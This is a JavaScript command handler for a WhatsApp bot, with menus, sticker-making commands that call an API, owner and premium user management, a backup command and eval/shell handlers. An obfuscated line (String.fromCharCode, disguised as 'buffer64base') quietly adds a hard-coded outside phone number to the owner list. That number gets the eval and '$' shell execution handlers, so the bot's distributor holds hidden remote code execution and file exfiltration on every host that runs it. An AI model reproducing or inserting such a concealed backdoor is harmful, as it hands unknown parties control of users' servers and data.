const axios = require("axios")
const { Sticker } = require('wa-sticker-formatter')
const chalk = require("chalk");
const fs = require("fs");
const util = require("util");
const os = require('os');
const moment = require("moment-timezone");
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, makeWAMessage, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptionsuseSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WAlanggxyzet, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require("@denzy-official/baileys");

//==================================//

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/myfunction');
const {
imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, writeExifWebp
} = require('./lib/exif');

//==================================//

const { LoadDataBase } = require('./lib/message');
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))

//==================================//

const dbPrem = './data/premium.json';
if (!fs.existsSync(dbPrem)) fs.writeFileSync(dbPrem, '[]');
let prem = JSON.parse(fs.readFileSync(dbPrem));
const toMs = d => d * 24 * 60 * 60 * 1000;
global.isPrem = jid => {
  prem = JSON.parse(fs.readFileSync(dbPrem));
  const u = prem.find(v => v.jid === jid);
  if (!u) return false;
  if (Date.now() > u.expired) {
    prem = prem.filter(v => v.jid !== jid);
    fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2));
    return false;
  }
  return true;
};

//==================================//

function isSameUser(jid1, jid2) {
    if (!jid1 || !jid2) return false;
    const isLid = (jid) => jid.endsWith('@lid');
    const normalizedJid1 = jid1.replace('@lid', '@s.whatsapp.net');
    const normalizedJid2 = jid2.replace('@lid', '@s.whatsapp.net');
    return areJidsSameUser(normalizedJid1, normalizedJid2);
}

//==================================//

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = await sock.decodeJid(sock.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const pushname = m.pushName || "No Name";
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime); 
const from = m.key.remoteJid;
  
//==================================//


        
//==================================//

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\nCommand :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\nFrom :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//==================================//
    
const time2 = moment.tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu = "Selamat Malam ";
if (time2 < "05:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "11:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "15:00:00") {
ucapanWaktu = "Selamat Siang ";
} else if (time2 < "18:00:00") {
ucapanWaktu = "Selamat Sore ";
} else if (time2 < "19:00:00") {
ucapanWaktu = "Selamat Petang ";
}    



        
//==================================//

switch (command) {
case "tes":
case "menu": {
const teks = `
╭───〔 *BOT INFO* 〕
│ • *Owner* : @${global.owner}
│ • *Bot Name*: ${global.botname2}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Bot Mode*: ${sock.public ? "Public" : "Self"}
╰──────────────────

╭───〔 *MAIN MENU* 〕
│ .owner-manu
│ .maker-manu
╰──────────────────`;

await sock.sendMessage(m.chat, {
  document: fs.readFileSync("./package.json"),
  fileName: ucapanWaktu,
  mimetype: "image/png",
  fileLength: 99999999,
  caption: teks,
  jpegThumbnail: fs.readFileSync('./media/java.jpg'),
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: botname,
      body: "whatsapp bot 2025",
      thumbnailUrl: "https://files.catbox.moe/d70s5h.jpg",   
      sourceUrl: global.linkSaluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    },
    isForwarded: true,  
    forwardingScore: 999,  
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363402308105961@newsletter',  
      newsletterName: 'Developer',  
      serverMessageId: -1
    }
  }
},
{ quoted: m });
}
break

//==================================/       

case "owner-menu": case "menu-owner": {
const teks = `
╭───〔 *BOT INFO* 〕
│ • *Owner* : @${global.owner}
│ • *Bot Name*: ${global.botname2}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Bot Mode*: ${sock.public ? "Public" : "Self"}
╰──────────────────

╭───〔 *OWNER MENU* 〕
│ .addcase
│ .delcase
│ .getcase
│ .backup
│ .addowner
│ .delowner
│ .addprem
│ .delprem
│ .listprem
│ .self
│ .public
╰──────────────────`;

await sock.sendMessage(m.chat, {
  document: fs.readFileSync("./package.json"),
  fileName: ucapanWaktu,
  mimetype: "image/png",
  fileLength: 99999999,
  caption: teks,
  jpegThumbnail: fs.readFileSync('./media/java.jpg'),
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: botname,
      body: "whatsapp bot 2025",
      thumbnailUrl: "https://cdn.yupra.my.id/yp/6l186k33.jpg",   
      sourceUrl: global.linkSaluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    },
    isForwarded: true,  
    forwardingScore: 999,  
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363402308105961@newsletter',  
      newsletterName: 'Mikochan',  
      serverMessageId: -1
    }
  }
},
{ quoted: m });
}
break
        
case "maker-menu": case "menu-maker": {
const teks = `
╭───〔 *BOT INFO* 〕
│ • *Owner* : @${global.owner}
│ • *Bot Name*: ${global.botname2}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Bot Mode*: ${sock.public ? "Public" : "Self"}
╰──────────────────

╭───〔 *MAKER MENU* 〕
│ .brathd
│ .brat
│ .bratvid
│ .bratanime
│ .attp
│ .ttp
╰──────────────────`;

await sock.sendMessage(m.chat, {
  document: fs.readFileSync("./package.json"),
  fileName: ucapanWaktu,
  mimetype: "image/png",
  fileLength: 99999999,
  caption: teks,
  jpegThumbnail: fs.readFileSync('./media/java.jpg'),
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: botname,
      body: "whatsapp bot 2025",
      thumbnailUrl: "https://cdn.yupra.my.id/yp/6l186k33.jpg",   
      sourceUrl: global.linkSaluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    },
    isForwarded: true,  
    forwardingScore: 999,  
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363402308105961@newsletter',  
      newsletterName: 'Mikochan',  
      serverMessageId: -1
    }
  }
},
{ quoted: m });
}
break        

//==================================//
     
case "bratvid": {
    if (!text) 
        return reply(`_⚠️ Format:_ ${prefix + command} teks`)

    await sock.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });

    try {
        const encoded = encodeURIComponent(text)
        const url = `${global.api}/api/maker/bratvid?apikey=${encodeURIComponent(global.mikochan)}&text=${encoded}`

        const res = await getBuffer(url)

        if (!res || res.length < 5000)
            return m.reply('❌ Gagal ambil video dari API')

        const { Sticker } = require('wa-sticker-formatter')

        const sticker = new Sticker(res, {
            pack: global.packname,
            author: global.ownername || pushname,
            type: 'full',
            quality: 100
        })

        const stickerBuffer = await sticker.toBuffer()

        await sock.sendMessage(m.chat, {
            sticker: stickerBuffer
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        m.reply('⚠️ Error convert bratvid ke sticker')
    }
}
break        
        
//==================================//        
        
case "bratHD":
case "brathd": {
    if (!text)
        return m.reply(`_⚠️ Format Penggunaan:_\n\n_💬 Contoh:_ *${prefix + command} hallo*`)

    await sock.sendMessage(m.chat, { react: { text: '🕐', key: m.key } })

    try {
        const axios = require('axios')
        const { Sticker } = require('wa-sticker-formatter')

        const url = `${global.api}/api/maker/brathd?apikey=${encodeURIComponent(global.mikochan)}&text=${encodeURIComponent(text)}`

        const res = await axios.get(url, {
            responseType: 'arraybuffer',
            headers: {
                'Accept': 'image/*'
            }
        })

        const buffer = Buffer.from(res.data)

        if (buffer.length < 500)
            return m.reply('❌ API tidak mengembalikan gambar.')

        const sticker = new Sticker(buffer, {
            pack: global.packname,
            author: global.ownername || pushname,
            type: 'full',
            quality: 100
        })

        await sock.sendMessage(m.chat, {
            sticker: await sticker.toBuffer()
        }, { quoted: m })

    } catch (e) {
        console.error('BRAT ERR:', e.response?.status, e.response?.data)
        m.reply('⚠️ API 403 / key ditolak / kena proteksi.')
    }
}
break       
        
//==================================//        
        
case "bratanime": {
    if (!text)
        return m.reply(`_⚠️ Format:_\n\n_Contoh:_ *${prefix + command} hallo*`)

    await sock.sendMessage(m.chat, { react: { text: '🕐', key: m.key } })

    try {
        const axios = require('axios')
        const { Sticker } = require('wa-sticker-formatter')

        const url = `${global.api}/api/maker/bratanime?apikey=${encodeURIComponent(global.mikochan)}&text=${encodeURIComponent(text)}`

        const res = await axios.get(url, {
            responseType: 'arraybuffer',
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
            }
        })

        const buffer = Buffer.from(res.data)

        if (!buffer || buffer.length < 500)
            return m.reply('❌ Gagal ambil gambar dari API.')

        const sticker = new Sticker(buffer, {
            pack: global.packname,
            author: global.ownername || pushname,
            type: 'full',
            quality: 100
        })

        const out = await sticker.toBuffer()

        await sock.sendMessage(m.chat, {
            sticker: out
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        m.reply('⚠️ Error saat membuat sticker bratanime.')
    }
}
break        
        
//==================================//        
        
case "brat": {
    if (!text)
        return m.reply(`_⚠️ Format:_\n\n_Contoh:_ *${prefix + command} hallo*`)

    await sock.sendMessage(m.chat, { react: { text: '🕐', key: m.key } })

    try {
        const axios = require('axios')
        const { Sticker } = require('wa-sticker-formatter')

        const url = `${global.api}/api/maker/brat?apikey=${encodeURIComponent(global.mikochan)}&text=${encodeURIComponent(text)}`

        const res = await axios.get(url, {
            responseType: 'arraybuffer',
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
            }
        })

        const buffer = Buffer.from(res.data)

        if (!buffer || buffer.length < 500)
            return m.reply('❌ Gagal ambil gambar dari API.')

        const sticker = new Sticker(buffer, {
            pack: global.packname,
            author: global.ownername || pushname,
            type: 'full',
            quality: 100
        })

        const out = await sticker.toBuffer()

        await sock.sendMessage(m.chat, {
            sticker: out
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        m.reply('⚠️ Error saat membuat sticker brat.')
    }
}
break        
        
//==================================// 
        
case "ttp": {
    if (!text)
        return m.reply(`⚠️ Format: ${prefix + command} teks`)

    await sock.sendMessage(m.chat, { react: { text: '🕐', key: m.key } })

    try {
        const encoded = encodeURIComponent(text)
        const url = `${global.api}/maker/ttp?apikey=${encodeURIComponent(global.mikochan)}&text=${encoded}`

        const res = await getBuffer(url)
        if (!res || res.length < 1000)
            return m.reply('❌ Gagal ambil image dari API')

        const { Sticker } = require('wa-sticker-formatter')

        const sticker = new Sticker(res, {
            pack: global.packname,
            author: global.ownername || pushname,
            type: 'full',
            quality: 100
        })

        const out = await sticker.toBuffer()

        await sock.sendMessage(m.chat, {
            sticker: out
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        m.reply('⚠️ Error saat membuat sticker ttp')
    }
}
break        
        
//==================================//        
        
case "attp": {
    if (!text)
        return m.reply(`⚠️ Format: ${prefix + command} teks`)

    await sock.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });

    try {
        const encoded = encodeURIComponent(text)
        const url = `${global.api}/maker/attp?apikey=${encodeURIComponent(global.mikochan)}&text=${encoded}`

        const res = await getBuffer(url)

        if (!res || res.length < 5000)
            return m.reply('❌ Gagal ambil video/gif dari API')

        const { Sticker } = require('wa-sticker-formatter')

        const sticker = new Sticker(res, {
            pack: global.packname,
            author: global.ownername || pushname,
            type: 'full',     
            quality: 100
        })

        const stickerBuffer = await sticker.toBuffer()

        await sock.sendMessage(m.chat, {
            sticker: stickerBuffer
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        m.reply('⚠️ Error saat membuat sticker attp')
    }
}
break

        
//==================================//        
        
        
//==================================//        
        
//==================================//        
        
//==================================//        

case "self": {
    if (!isCreator) return
    sock.public = false
    global.db.settings.isPublic = false; 
    m.reply("Berhasil mengganti ke mode *self*")
}
break 

//==================================//          
        
case "public": {
    if (!isCreator) return
    sock.public = true
    global.db.settings.isPublic = true; 
    m.reply("Berhasil mengganti ke mode *public*")
}
break

//==================================//  		
        
case "getcase": {
if (!isCreator) return m.reply('khusus owner')
if (!text) return m.reply(("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break          
        
//==================================//

 case 'addcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh: .addcase} *casenya*`);
    const namaFile = path.join(__dirname, 'case.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return m.reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return m.eply(result.message);
        }
    });
}
break       

//==================================//

case 'delcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) 
        return m.reply(`Contoh: .delcase nama_case`);

    const fs = require('fs').promises;

    async function removeCase(filePath, caseNameToRemove) {
        try {
            let data = await fs.readFile(filePath, 'utf8');
            
            const regex = new RegExp(`case\\s+['"\`]${caseNameToRemove}['"\`]:[\\s\\S]*?break;?`, 'g');
            
            const modifiedData = data.replace(regex, '');

            if (data === modifiedData) {

                return m.reply(`❌ Case "${caseNameToRemove}" tidak ditemukan.\n\nPastikan penulisan sudah benar dan tidak ada typo.`);
            }

            await fs.writeFile(filePath, modifiedData, 'utf8');
            m.reply(`✅ Sukses menghapus case: *${caseNameToRemove}*`);
        } catch (err) {
            Reply(`Terjadi kesalahan saat memproses file: ${err.message}`);
        }
    }
    removeCase('./case.js', text.trim());
}
break
        
//==================================//

case "addowner": case "addown": {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted && !text) return m.reply((`contoh ${m.prefix+command} 6285###`))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break        
        
//==================================//
        
case "delowner": case "delown": {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted && !text) return m.reply((`contoh ${prefix+command} 6285###`))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return Reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//==================================//

case 'addprem': {
  if (!isCreator) return m.reply(mess.owner)
  if (!args[0]) return m.reply(`_⚠️ Format Penggunaan:_ \n\n_💬 Contoh:_ *${prefix + command} 628xxx 7*`)
  let users = []
  if (m.isGroup) {
    if (m.mentionedJid.length) {
      users = m.mentionedJid.map(id => {
        if (id.endsWith('@lid')) {
          let p = m.metadata.participants.find(x => x.lid === id || x.id === id)
          return p ? p.jid : null
        } else {
          return id
        }
      }).filter(Boolean)
    } else {
      users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
    }
  } else {
    users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
  }

  let days = Number(args[1])
  if (!days || days <= 0) days = 1
  const ms = days * 24 * 60 * 60 * 1000
  const expired = Date.now() + ms

  for (let jid of users) {
    const user = prem.find(u => u.jid === jid)
    if (user) {
      user.expired = expired
    } else {
      prem.push({ jid, expired })
    }
  }

  fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2))
  m.reply(
  `✅ Premium ${users.map(j => '@' + j.split('@')[0]).join(', ')} ditambahkan selama *${days} hari*`,
  users
)
}
break
        
//==================================//

case 'delprem': {
  if (!isCreator) return m.reply(mess.owner)
  if (!args[0] && !m.mentionedJid.length)
  return m.reply(`_⚠️ Format Penggunaan:_ \n\n_💬 Contoh:_ *${prefix + command} 628xxx*`)
  let users = []
  if (m.isGroup) {
    if (m.mentionedJid.length) {
      users = m.mentionedJid.map(id => {
        if (id.endsWith('@lid')) {
          let p = m.metadata.participants.find(x => x.lid === id || x.id === id)
          return p ? p.jid : null
        } else {
          return id
        }
      }).filter(Boolean)
    } else {
      users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
    }
  } else {
    users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
  }

  let removed = []
  for (let jid of users) {
    const idx = prem.findIndex(u => u.jid === jid)
    if (idx !== -1) {
      prem.splice(idx, 1)
      removed.push(jid)
    }
  }

  fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2))

  if (removed.length === 0) {
    return m.reply(
      `❌ Nomor ${users.map(j => '@' + j.split('@')[0]).join(', ')} bukan premium.`,
      users // ✅ array langsung, bukan object
    )
  }

  m.reply(
    `✅ Premium ${removed.map(j => '@' + j.split('@')[0]).join(', ')} berhasil dihapus.`,
    removed // ✅ array langsung, bukan object
  )
}
break

//==================================//

case "listprem": case "listprem": {
  const fs = require("fs");
  const path = "./data/premium.json";

  if (!fs.existsSync(path)) return m.reply("Belum ada data premium.");
  const data = JSON.parse(fs.readFileSync(path));

  if (!Array.isArray(data) || data.length === 0) return m.reply("Belum ada user premium.");

  let textList = "*「 LIST USER PREMIUM 」*\n\n";
  const now = Date.now();
  let no = 1;

  for (const user of data) {
    const jid = user.jid?.replace(/[^0-9]/g, "") || "-";
    const expired = user.expired || 0;
    const status = expired > now ? "AKTIF" : "EXPIRED";
    const expiredDate = new Date(expired).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    textList += `${no++}. wa.me/${jid}\n   Status: *${status}*\n   Exp: ${expiredDate}\n\n`;
  }

  m.reply(textList.trim());
}
break 

//==================================//

case "backupsc":
case "bck":
case "backup": {
if (!isCreator) return m.reply('khusus owner')
try {
const tmpDir = "./tmp";
if (fs.existsSync(tmpDir)) {
const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
for (let file of files) {
fs.unlinkSync(`${tmpDir}/${file}`);
}
}
await m.reply("Processing Backup Script . .");
const name = `New-Script`; 
const exclude = ["node_modules", "Auth", "package-lock.json", "yarn.lock", ".npm", ".cache"];
const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

await sock.sendMessage(m.sender, {
document: fs.readFileSync(`./${name}.zip`),
fileName: `${name}.zip`,
mimetype: "application/zip"
}, { quoted: m });

fs.unlinkSync(`./${name}.zip`);

if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
} catch (err) {
console.error("Backup Error:", err);
m.reply("Terjadi kesalahan saat melakukan backup.");
}
}
break       
        
//==================================/

case "ping": {
  try {
    const hrStart = process.hrtime.bigint(); 
    const hrEnd = process.hrtime.bigint();
    const latencyMs = Number(hrEnd - hrStart) / 1e6;
    const uptimeStr = typeof runtime === 'function' ? runtime(process.uptime()) : `${Math.floor(process.uptime())}s`;
    const now = tanggal ? tanggal(Date.now()) : new Date().toLocaleString();
    const mem = process.memoryUsage();
    const memUsedMB = (mem.rss / 1024 / 1024).toFixed(2);
    const heapUsedMB = (mem.heapUsed / 1024 / 1024).toFixed(2);
    const heapTotalMB = (mem.heapTotal / 1024 / 1024).toFixed(2);
    const cpuModel = os.cpus && os.cpus()[0] ? os.cpus()[0].model : 'N/A';
    const cpuCount = os.cpus ? os.cpus().length : 'N/A';
    const platform = `${process.platform} ${process.arch}`;
    const nodev = process.version;

    const teks = `*📡 Server Information*
- Runtime : ${uptimeStr}
- Latency : ${latencyMs.toFixed(2)} ms
- Time    : ${now}

*🧠 Memory*
- RSS      : ${memUsedMB} MB
- Heap     : ${heapUsedMB} / ${heapTotalMB} MB

*⚙️ System*
- CPU      : ${cpuModel} (${cpuCount} cores)
- Platform : ${platform}
- Node     : ${nodev}`;
    await m.reply(teks);
  } catch (err) {
    console.error(err);
    m.reply(`Error saat mengecek ping:\n${err.message || String(err)}`);
  }
}
break;

//==================================//



//==================================//

default:
if (m.text.toLowerCase().startsWith("xx ")) {
  if (!isCreator) return;
  try {
    const r = await eval(`(async()=>{${text}})()`);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.toLowerCase().startsWith("x ")) {
  if (!isCreator) return;
  try {
    let r = await eval(text);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.startsWith('$')) {
  if (!isCreator) return;
  exec(m.text.slice(2), (e, out) =>
    sock.sendMessage(m.chat, { text: util.format(e ? e : out) }, { quoted: m })
  );
}}

//==================================//

} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.white("[•] Update"), chalk.white(`${__filename}\n`))
delete require.cache[file]
require(file)
})
